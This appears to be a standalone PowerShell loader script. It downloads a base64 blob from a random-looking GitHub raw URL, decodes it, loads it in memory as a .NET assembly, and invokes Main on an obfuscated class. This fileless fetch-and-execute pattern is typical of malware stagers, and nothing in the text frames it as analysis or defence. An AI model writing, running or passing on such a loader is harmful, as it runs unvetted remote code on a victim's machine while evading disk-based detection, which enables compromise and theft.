$url = "https://raw.githubusercontent.com/HeadShotXx/dxdasaxdsacdsadsacdsxdasacdaxsdcsdaxsadaxdscsa/main/deneme.txt"

$response = Invoke-WebRequest -Uri $url -UseBasicParsing

if ($response.StatusCode -eq 200) {
    $base64String = $response.Content

    $byteArray = [System.Convert]::FromBase64String($base64String)
    $assembly = [System.Reflection.Assembly]::Load($byteArray)

    $class = $assembly.GetType("QJAMsrpfhk.HH")
    $method = $class.GetMethod("Main")

    $instance = [System.Activator]::CreateInstance($class)
    $method.Invoke($instance, @())

} else {
    Write-Host "Failed to download base64String. Status code: $($response.StatusCode)"
}
